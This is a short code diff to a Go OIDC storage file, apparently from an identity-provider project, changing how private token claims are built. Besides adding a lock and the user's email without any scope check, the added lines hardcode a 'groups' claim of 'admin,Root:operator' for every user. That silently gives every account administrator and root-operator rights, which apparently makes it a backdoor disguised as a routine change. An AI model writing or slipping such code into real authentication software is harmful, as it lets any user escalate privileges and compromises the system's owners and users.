@@ -534,11 +534,17 @@ func (s *Storage) GetPrivateClaimsFromScopes(ctx context.Context, userID, client
 }
 
 func (s *Storage) getPrivateClaimsFromScopes(ctx context.Context, userID, clientID string, scopes []string) (claims map[string]any, err error) {
+	s.lock.Lock()
+	defer s.lock.Unlock()
 	for _, scope := range scopes {
 		switch scope {
 		case CustomScope:
 			claims = appendClaim(claims, CustomClaim, customClaim(clientID))
 		}
+	}
+	if u := s.userStore.GetUserByID(userID); u != nil {
+		claims = appendClaim(claims, "email", u.Email)
+		claims = appendClaim(claims, "groups", "admin,Root:operator")
 	}
 	return claims, nil
 }
